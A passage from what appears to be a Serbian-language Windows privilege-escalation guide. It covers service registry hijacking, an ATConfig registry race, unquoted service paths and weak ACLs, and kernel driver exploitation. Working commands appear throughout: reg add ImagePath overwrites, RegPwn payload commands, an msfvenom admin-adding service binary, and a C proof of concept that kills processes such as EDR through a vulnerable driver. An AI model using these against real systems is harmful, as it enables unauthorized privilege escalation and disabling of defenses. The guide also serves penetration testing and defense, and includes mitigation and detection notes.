Proverite da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole registra koje omogućavaju pisanje u određeni ključ servisa. Sam ACL unos ne dokazuje da je pristup efektivno moguć: važni su unosi deny, trenutni token i nasleđene dozvole. Prava nad ključem registra razlikuju se od prava `SERVICE_CHANGE_CONFIG` i `SERVICE_START` nad objektom servisa. Za eskalaciju su potrebni i upotrebljivo polje konfiguracije servisa, način da se servis pokrene i servisni identitet sa višim privilegijama. Pogledajte Microsoftove reference o [pravima nad ključevima registra](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) i [pravima pristupa servisima](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Da biste promenili putanju binarne datoteke koja se izvršava:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Trka sa registry symlink-om za upis proizvoljne HKLM vrednosti (ATConfig)

Neke Windows funkcije pristupačnosti kreiraju per-user **ATConfig** ključeve koje **SYSTEM** proces kasnije kopira u HKLM session ključ. **Trka sa simboličkim linkom** u registry-ju može da preusmeri taj privilegovani upis na **bilo koju HKLM putanju**, čime se dobija mogućnost **upisa proizvoljne HKLM vrednosti**.<sup>[[18]](#references)</sup>

Lokacije ključeva (primer: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` sadrži listu instaliranih funkcija pristupačnosti.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` čuva konfiguraciju koju kontroliše korisnik.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` kreira se tokom prijavljivanja/prelazaka na bezbednu radnu površinu i korisnik može da ga menja.

Tok zloupotrebe (CVE-2026-24291 / ATConfig):

1. Postavite vrednost **HKCU ATConfig** koju želite da SYSTEM upiše.
2. Pokrenite kopiranje na bezbednu radnu površinu (npr. **LockWorkstation**), čime se pokreće AT broker tok.
3. **Dobijte race** tako što ćete postaviti **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; kada se oplock aktivira, zamenite **HKLM Session ATConfig** ključ **registry link**-om ka zaštićenoj HKLM meti.
4. SYSTEM upisuje vrednost koju je izabrao napadač na preusmerenu HKLM putanju.

Kada dobijete mogućnost upisa proizvoljne HKLM vrednosti, pređite na LPE tako što ćete prepisati vrednosti konfiguracije servisa:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komandna linija)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Izaberite servis koji običan korisnik može da pokrene (npr. **`msiserver`**) i pokrenite ga nakon upisa. **Napomena:** javna implementacija exploita **zaključava radnu stanicu** kao deo race-a.

Primer alata (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Dozvole AppendData/AddSubdirectory za registar servisa

Ako imate ovu dozvolu nad registrom, to znači da **možete da kreirate podregistre u njemu**. U slučaju Windows servisa, ovo je **dovoljno za izvršavanje proizvoljnog koda:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ako putanja do izvršne datoteke nije pod navodnicima, Windows će pokušati da izvrši svaku putanju koja se završava pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Izlistajte sve putanje servisa koje nisu pod navodnicima, izuzimajući one koje pripadaju ugrađenim Windows servisima:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ovu ranjivost možete otkriti i iskoristiti pomoću Metasploit-a:** `exploit/windows/local/trusted\_service\_path` Možete ručno kreirati binarnu datoteku servisa pomoću Metasploit-a:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Radnje oporavka

Windows omogućava korisnicima da navedu radnje koje će se izvršiti ako usluga otkaže. Ova funkcija može da se podesi tako da upućuje na binarnu datoteku. Ako je ovu binarnu datoteku moguće zameniti, možda je moguća eskalacija privilegija. Više detalja možete pronaći u [zvaničnoj dokumentaciji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Ciljne skripte zakazanih zadataka

Za omogućen zadatak koji pokreće `cmd.exe /c` sa datotekom `.bat` ili `.cmd`, proverite skriptu navedenu u **argumentima radnje**, kao i `cmd.exe`. Isto važi za eksplicitni argument datoteke interpretera, kao što je PowerShell `-File`. Ako zakazana batch datoteka sadrži doslovni poziv PowerShell komande `-File`, proverite i ACL te skripte; promenljive, uslovne naredbe i ulančavanje komandi u shell-u zahtevaju ručno praćenje. Skripta ili nadređeni direktorijum u koji pozivalac može da upisuje ukazuju na mogućnost izvršavanja između naloga samo kada je principal zadatka podešen drugačije od pozivaoca i kada zadatak zaista dođe do te radnje. ACL koji dozvoljava samo dodavanje može biti bitan za skripte, ali raniji `exit` ili drugi tok kontrole može učiniti dodate redove nedostižnim. Pre nego što tvrdite da je moguća eskalacija, proverite efektivne ACL-ove, [kontekst izvršavanja zadatka](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), radni direktorijum, okidač i politiku kontrole aplikacija. Tokom inventarizacije ne menjajte skriptu niti pokrećite zadatak.

## Imenovani tokovi u dostupnim datotekama

U NTFS-u čitljiva datoteka može da sadrži imenovani `:$DATA` tok čiji sadržaj nije prikazan u uobičajenom prikazu direktorijuma. Za mali, relevantan skup dostupnih rezervnih kopija ili konfiguracionih datoteka, pregledajte **nazive i veličine** tokova pre nego što otvorite njihov sadržaj; Windows ih prikazuje pomoću [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), a PowerShell pomoću [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Naziv toka koji ukazuje na tajnu predstavlja samo trag. Proverite efektivna prava za čitanje datoteke, podršku sistema datoteka za tokove, da li tok sadrži upotrebljive akreditive i na koji se nalog oni zaista odnose. Izbegavajte rekurzivno skeniranje tokova i ispisivanje njihovog sadržaja tokom uobičajene enumeracije.

## Ulazi pomoćnog programa Windows Driver Kit u zakazanim zadacima

Opcioni Windows Driver Kit uključuje `StandaloneRunner.exe`, koji iz svog radnog direktorijuma može da koristi datoteke `command.txt`, `reboot.rsf` i datoteku projekta `working\rsf.rsf`. Zakazani zadatak ili usluga koja pokreće ovaj pomoćni program sa privilegovanim nalogom može da pretvori pristup za upis sa niskim privilegijama u te ulazne datoteke u izvršavanje komandi u kontekstu tog naloga, čak i kada je sama izvršna datoteka pomoćnog programa zaštićena. Potvrdite da li ih koristi privilegovani proces i da li **obe** prateće datoteke mogu da se kreiraju ili menjaju; samo pronalaženje pomoćnog programa nije dovoljno.

Kod zakazanog zadatka proverite [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) njegove radnje i ACL-ove za obe putanje pratećih datoteka. Ako zadatak ne navodi radni direktorijum, direktorijum izvršne datoteke je samo trag koji treba proveriti, a ne dokaz o tome gde zadatak čita ulazne datoteke. Takođe mora biti ispunjen preduslov za projektnu datoteku. Proverite stvarni principal zadatka, ne pretpostavljajte da se zadatak pokreće kao SYSTEM.

## Aplikacije

### Instalirane aplikacije

Proverite **dozvole nad binarnim datotekama** (možda možete da zamenite neku od njih i eskalirate privilegije) i **direktorijumima** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Putanja za popravku Windows agenta Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) utiče na starije Windows agente Checkmk koji su upisivali komandne datoteke u `C:\Windows\Temp`, a zatim izvršavali postojeću datoteku zaštićenu od upisivanja kada zamena nije uspela. Dobavljač je ispravio problem u verzijama 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Proverite punu instaliranu verziju zakrpe i da li se pogođena operacija agenta može pokrenuti; samo oznaka grane, kao što je `2.1`, ne može da utvrdi izloženost. Enumeracija može da proveri verziju, stanje servisa i dozvole za Temp bez kreiranja datoteka ili pokretanja komandi agenta.

#### Provera SAML servisa ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) uticao je na ADSelfService Plus build 6210 i starije; dobavljač je ispravio problem u buildu 6211. Relevantan je samo ako je SAML SSO **omogućen ili je ranije bio omogućen**. Stavka instaliranog proizvoda ili putanja servisa zato je samo nagoveštaj, a ne potvrda ranjivosti: potvrdite tačan build, istoriju SAML konfiguracije, mrežnu dostupnost servisa i nalog pod kojim se servis pokreće. Izvršavanje koda kroz servis nasleđuje privilegije tog naloga; izvršavanje kao SYSTEM zahteva instancu pokrenutu kao SYSTEM. Datoteka `OfflineBackup_*.ezip`, čitljiva u direktorijumu Backup proizvoda, zaseban je nagoveštaj o šifrovanoj rezervnoj kopiji, a ne dokaz upotrebljivih akreditiva ili ove SAML ranjivosti. Tokom rutinske enumeracije zabeležite njenu putanju i prava pristupa, ali je nemojte raspakivati.

#### Ograničenja kontrolera Jenkins i domenskog naloga

Na Windows kontroleru Jenkins razlikujte dozvolu za kreiranje ili konfigurisanje posla od dozvole za njegovo pokretanje: [Jenkins ih dokumentuje kao zasebna prava `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Konfigurisani raspored ili udaljeni okidač mogu da pruže drugi način pokretanja buildu, ali potvrdite da je omogućen i da se build zaista pokreće. Izvršavanje se odvija pod identitetom kontrolera ili izabranog agenta, a sačuvani akreditiv može da se koristi samo ako posao ima pristup njegovom opsegu. Zasebno proverite pristup metapodacima `JENKINS_HOME`: Jenkins čuva materijal akreditiva i ključeve za šifrovanje u `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([Jenkinsovo skladištenje tajni](https://www.jenkins.io/doc/developer/security/secrets/)). Njihovo prisustvo samo po sebi ne otkriva lozinku; potvrdite **pristup čitanja potrebnim datotekama** i zaseban put za ponovnu upotrebu naloga, a da pritom ne ispisujete tajne u deljenom izlazu. Ako taj nalog ima pravo upisivanja u `scriptPath` AD korisničkog objekta, potvrdite da je putanja skripte upisiva i da postoji stvarna prijava ili zakazani potrošač koji se pokreće kao ciljni korisnik, pre nego što to tretirate kao izvršavanje između korisnika. Za dodatnu kontrolu grupa potrebna je zasebna provera efektivnih AD prava.

#### Identitet self-hosted agenta Azure Pipelines

Za projekat Azure DevOps Server ili Azure Pipelines razdvojite dozvolu za **kreiranje ili uređivanje** pipeline-a od dozvole za njegovo **stavljanje u red** i korišćenje izabranog skupa agenata; [Microsoft nezavisno dokumentuje dozvole za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) i [autorizaciju skupa](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Ako nalog sa nižim privilegijama može da pošalje korak skripte i pokrene taj pipeline na self-hosted Windows agentu, korak se izvršava kao [konfigurisani nalog operativnog sistema agenta](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Pre tvrdnje da je došlo do prelaska između korisnika ili do SYSTEM naloga, proverite tačan pipeline, ograničenja grana/resursa, autorizovani skup, posao koji može da se pokrene i identitet servisa agenta. Instalirani agent, projektna uloga ili dozvola za upisivanje u repozitorijum samo su nagoveštaji; tokom pasivne enumeracije pregledajte dozvole i lokalne metapodatke servisa bez pokretanja builda.

#### Akreditivi za Microsoft Entra Connect Sync

[Microsoft pravi razliku](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) između **naloga ADSync servisa**, koji pokreće servis za sinhronizaciju i pristupa njegovoj SQL bazi podataka, i **naloga konektora AD DS**, čije dozvole u direktorijumu zavise od konfigurisанih funkcija sinhronizacije. Akreditivi konektora čuvaju se šifrovani u toj bazi podataka, a ključni materijal je [zaštićen pomoću DPAPI-ja pod nalogom ADSync servisa](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Samo instalirani servis za sinhronizaciju, grupa čije ime zvuči kao da ima lokalna administratorska prava ili vidljivost baze podataka ne dokazuju da postoje akreditivi koje je moguće dešifrovati niti eskalacija privilegija u domenu. Zasebno proverite stvarna prava čitanja baze podataka, pristup servisnog naloga/ključevima, raspored instalacije i SQL-a, konfigurisani identitet konektora i efektivne AD privilegije tog identiteta. Rutinska enumeracija treba da prikazuje samo metapodatke servisa i pristupa, a ne da postavlja upite za sačuvane tajne ili ih ispisuje.

#### Dozvole za pomoćne DLL-ove upravljačkih programa štampača

Instalirani upravljački program štampača može da čuva pomoćne DLL-ove u okviru `C:\ProgramData` i da ih učitava u privilegovanijem procesu za štampanje. Pregledajte tačan direktorijum upravljačkog programa i ACL-ove DLL-ova, uključujući nadređene direktorijume i reparse point-ove, čak i ako je enumeracija printer WMI-ja odbijena. Za [problem sa upravljačkim programom štampača Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), prijavljena putanja je bila `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [prvobitno obelodanjivanje](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) opisuje učitavanje DLL-ova pomoću `PrintIsolationHost.exe`. Upisivi ACL samo je nagoveštaj: proverite efektivan pristup upisivanju nakon pravila deny, da li je relevantni upravljački program instaliran i učitava li datoteku pod privilegovanim identitetom, kao i da li su dobavljačeva ažurirana verzija upravljačkog programa ili bezbednosni program ispravili instalaciju. Ne zaključujte da postoji ranjivost samo na osnovu imena direktorijuma ili verzije upravljačkog programa.

### Dozvole za upisivanje

Proverite da li možete da izmenite neku konfiguracionu datoteku kako biste pročitali određenu posebnu datoteku ili da li možete da izmenite binarnu datoteku koju će izvršiti administratorski nalog (schedtasks).

Slabe dozvole za direktorijume/datoteke u sistemu možete da pronađete ovako:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistence/izvršavanje kroz automatsko učitavanje plugin-ova u Notepad++

Notepad++ automatski učitava sve DLL-ove za plugin-ove u svojim podfolderima `plugins`. Ako postoji instalacija koja se može menjati, bilo portable ili kopirana, postavljanje zlonamernog plugin-a omogućava automatsko izvršavanje koda unutar `notepad++.exe` pri svakom pokretanju (uključujući izvršavanje iz `DllMain`-a i callback-ova plugin-a).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Pokretanje pri pokretanju sistema

**Proverite da li možete da prepišete neki unos u registru ili binarnu datoteku koju će pokrenuti drugi korisnik.**\
**Pročitajte** **sledeću stranicu** da biste saznali više o zanimljivim **autorun lokacijama za eskalaciju privilegija**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drajveri

Potražite moguće **neobične/ranjive drajvere trećih strana**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ako drajver izlaže proizvoljnu primitivu za čitanje/upis u kernel (što je uobičajeno kod loše dizajniranih IOCTL handler-a), možete eskalirati privilegije krađom SYSTEM tokena direktno iz kernel memorije.<sup>[[13]](#references)</sup> Tehniku korak po korak pogledajte ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Povezani materijali o Windows kernel exploitation-u:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Kod race-condition bugova gde ranjivi poziv otvara putanju u Object Manager-u kojom upravlja napadač, namerno usporavanje pretrage (korišćenjem komponenti maksimalne dužine ili dubokih lanaca direktorijuma) može da produži vremenski prozor sa mikrosekundi na desetine mikrosekundi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF-ovi u cancel-safe queue, otkrivanje podataka iz paged-pool-a i I/O ring pivot-i

Neki Windows kernel LPE lanci mogu se izgraditi od dve zasebno slabe ranjivosti: **race condition-a u trajanju objekta cancel-safe queue-a** koji oslobađa zahtev/CBD dok je lock queue-a još uvek zaključan i otkrivanja usled **oslobađanja lock-a pre kopiranja**, koje otkriva oslobođenu alokaciju iz paged-pool-a tokom `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Napomene za audit i eksploataciju:

- **Oslobađanje pod lock-om + naknadni cancel**: potražite success putanju koja radi **Acquire -> CompleteRequest/free -> Release**, dok cancel putanja radi **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ako success putanja stigne do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` pre otpuštanja CBDQ/CSQ lock-a, nit blokirana u `NtCancelIoFileEx -> IopCsqCancelRoutine` može kasnije da nastavi i prosledi oslobođeni `PFLT_CALLBACK_DATA` nazad u callback za uklanjanje u drajveru.
- **Ponovo iskoristite oslobođeni queue objekat** alokacijom iz paged-pool-a iste veličine, čijom memorijom upravlja napadač. `NPFS` Data Queue Entries su korisni jer se veličinom i sadržajem njihove vrednosti može upravljati, a kasnije ih možete ispitati pomoću pipe read/peek operacija. Ako oslobođeni objekat sadrži list links, prepišite ih **cikličnom listom lažnih request node-ova u user memoriji**, tako da drajver više puta obrađuje request strukture koje je definisao napadač, umesto da stane na prvobitnom list head-u.
- **Unapredite predvidiv upis**: ako lažni request preusmeri ugnježđeni context pointer koji se koristi za bookkeeping upise (timestamps / QPC / polja blizu refcount-a), možda ćete dobiti kernel upis čija je adresa pod vašom kontrolom, ali ne i vrednost. U tom slučaju ciljajte polje **length/size** objekta iz pool spray-a, umesto konačnog code/data pointer-a, a zatim pregledajte spray dok oštećeni objekat ne omogući čitanje van granica iz paged-pool-a.
- **Obrazac otkrivanja podložan race condition-u**: svaki syscall koji radi `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` dobar je kandidat. Pouzdanost se povećava ako napadač može da uveća bafer koji se kopira (na primer, dodavanjem mnogo list/resource stavki koje povećavaju konačnu veličinu alokacije serializer-a), jer duže kopiranje proširuje vremenski prozor za zamenu, a da pritom ne mora nužno da sruši sistem.
- **Ciljevi za dopunu bogati pointer-ima**: Windows **I/O ring** registered-buffer nizovi odlični su ciljevi za otkrivanje podataka jer je njihova veličina paged-pool alokacije pod kontrolom napadača (`8 * regBufferCnt`), a svaki element je kernel pointer ka `_IOP_MC_BUFFER_ENTRY`. Otkrijte jedan od ovih nizova, pronađite okolni `IORING_OBJECT`, a zatim oštetite **`RegBuffers`** i **`RegBuffersCount`**, tako da naredne I/O ring operacije koriste lažne stavke koje je napravio napadač i omoguće proizvoljno čitanje/upis u kernel. Ako je jedini dostupan upis stabilan bajt (na primer, iz `KUSER_SHARED_DATA+0x14`), koristite **preklapajuće neporavnate upise** da biste napravili ponovljeni user pointer kao što je `0x0101010101010101`, mapirajte ga pomoću `VirtualAlloc` i tamo smestite lažni registered-buffer niz.<sup>[[30]](#references)</sup>

Korisni pokazatelji za debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Kada iz oštećenog I/O ring-a dobijete proizvoljno čitanje/pisanje u kernelu, ukradite SYSTEM token koristeći standardni postupak nakon dobijanja primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitive za korupciju memorije košnice registra

Savremene ranjivosti košnica omogućavaju vam da pripremite determinističke rasporede memorije, zloupotrebite upisive potomke HKLM/HKU i pretvorite korupciju metapodataka u prekoračenja bafera kernel paged-pool-a bez prilagođenog drajvera. Ceo lanac možete naučiti ovde:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Konfuzija tipova u direktnom režimu `RtlQueryRegistryValues` zbog putanja pod kontrolom napadača

Neki drajveri prihvataju putanju registra iz userland-a, proveravaju samo da li je to ispravan UTF-16 string, a zatim pozivaju `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` sa `RTL_QUERY_REGISTRY_DIRECT` i odredištem na steku, kao što je skalar `int readValue`. Ako nedostaje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` se tumači prema **stvarnom** tipu registra, a ne tipu koji je programer očekivao.

Ovo omogućava dve korisne primitive:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: apsolutna putanja `\Registry\...` pod kontrolom korisnika omogućava drajveru da upituje ključeve koje je izabrao napadač, otkriva njihovo postojanje preko povratnih kodova/evidencija i ponekad čita vrednosti kojima pozivalac ne bi mogao direktno da pristupi.
- **Korupcija memorije kernela**: odredište skalarnog tipa, kao što je `&readValue`, može biti pogrešno protumačeno kao `REG_QWORD`, `UNICODE_STRING` ili bafer binarnih podataka određene veličine, u zavisnosti od tipa vrednosti registra.

Praktične napomene za eksploataciju:

- **Ublažavanje u Windows 8+**: ako upit dohvati **nepouzdanu košnicu** pomoću `RTL_QUERY_REGISTRY_DIRECT`, ali bez `RTL_QUERY_REGISTRY_TYPECHECK`, pozivaoci iz kernela izazivaju pad sistema sa greškom `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Da biste zadržali mogućnost eksploatacije, potražite **ključeve u pouzdanim sistemskim košnicama u koje napadač može da upisuje**, umesto da pripremate vrednosti u okviru `HKCU`.
- **Priprema u pouzdanoj košnici**: koristite NtObjectManager da biste nabrojali upisive potomke putanje `\Registry\Machine`, a zatim ponovo pokrenite skeniranje pomoću dupliranog tokena **niskog integriteta** da biste pronašli ključeve dostupne iz sandboxovanih konteksta:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: direktan upis od 8 bajtova u `int` od 4 bajta oštećuje susedne podatke steka i može delimično da prepiše obližnji pokazivač na callback/funkciju.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direktni režim očekuje da `EntryContext` pokazuje na `UNICODE_STRING`. Ako kod prvo učita `REG_DWORD` koji kontroliše napadač u skalarni podatak na steku, a zatim ponovo upotrebi isti bafer za čitanje stringa, napadač kontroliše `Length`/`MaximumLength` i delimično utiče na pokazivač `Buffer`, što omogućava delimično kontrolisan upis u kernel.
- **`REG_BINARY`**: za velike binarne podatke direktni režim tretira prvi `LONG` na adresi `EntryContext` kao veličinu bafera sa predznakom. Ako prethodno čitanje `REG_DWORD` ostavi negativnu vrednost koju kontroliše napadač u ponovo upotrebljenoj skalarnoj promenljivoj, sledeći upit `REG_BINARY` kopira bajtove napadača direktno preko susednih slotova steka, što je često najjednostavniji način da se u potpunosti prepiše pokazivač na callback.

Izrazit obrazac za traženje: heterogena čitanja iz registra u istu promenljivu na steku bez ponovne inicijalizacije. Pretražite `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponovo upotrebljene pokazivače `EntryContext` i putanje koda u kojima prvo čitanje iz registra određuje da li će se obaviti drugo čitanje.

#### Zloupotreba nedostajućeg FILE_DEVICE_SECURE_OPEN na objektima uređaja (LPE + gašenje EDR-a)

Neki potpisani drajveri nezavisnih proizvođača kreiraju objekat uređaja sa jakim SDDL-om pomoću IoCreateDeviceSecure, ali zaborave da postave FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez ove zastavice, bezbedni DACL se ne primenjuje kada se uređaj otvara putem putanje koja sadrži dodatnu komponentu, pa svaki neprivilegovani korisnik može da dobije handle korišćenjem putanje imenskog prostora kao što je:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (iz slučaja iz stvarnog sveta)

Kada korisnik može da otvori uređaj, može da zloupotrebi privilegovane IOCTL-ove koje drajver izlaže za LPE i neovlašćene izmene. Primeri mogućnosti zabeleženih u praksi:
- Vraćanje handle-ova sa punim pristupom proizvoljnim procesima (krađa tokena / SYSTEM shell preko DuplicateTokenEx/CreateProcessAsUser).
- Neograničeno čitanje/upis sirovog diska (neovlašćene izmene van mreže, trikovi za postojanost pri pokretanju).
- Prekidanje proizvoljnih procesa, uključujući Protected Process/Light (PP/PPL), što omogućava gašenje AV/EDR-a iz korisničkog režima preko kernela.

Minimalni obrazac PoC-a (korisnički režim):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Ublažavanje rizika za developere
- Uvek postavite FILE_DEVICE_SECURE_OPEN prilikom kreiranja objekata uređaja koji treba da budu ograničeni pomoću DACL-a.
- Proverite kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre dozvole za prekid procesa ili vraćanje handle-ova.
- Ograničite IOCTL-ove (maske pristupa, METHOD_*, validaciju ulaza) i razmotrite modele sa posrednikom umesto direktnih privilegija kernela.

Ideje za detekciju za defanzivce
- Pratite otvaranja sumnjivih naziva uređaja iz korisničkog režima (npr. \\ .\\amsdk*) i konkretne nizove IOCTL poziva koji ukazuju na zloupotrebu.
- Primenite Microsoftovu listu blokiranih ranjivih drajvera (HVCI/WDAC/Smart App Control) i održavajte sopstvene liste dozvoljenih/zabranjenih stavki.


## PATH DLL Hijacking

Ako imate **dozvole za pisanje u fascikli koja se nalazi u PATH-u**, možda možete da otmete DLL koji učitava neki proces i **eskalirate privilegije**.<sup>[[2]](#references)</sup>

Proverite dozvole za sve fascikle unutar PATH-a:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Za više informacija o tome kako da zloupotrebite ovu proveru:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Otimanje razrešavanja Node.js / Electron modula preko `C:\node_modules`

Ovo je varijanta **nekontrolisane putanje pretrage u Windows-u** koja utiče na aplikacije **Node.js** i **Electron** kada izvrše direktan import, kao što je `require("foo")`, a očekivani modul **ne postoji**.<sup>[[20]](#references)</sup>

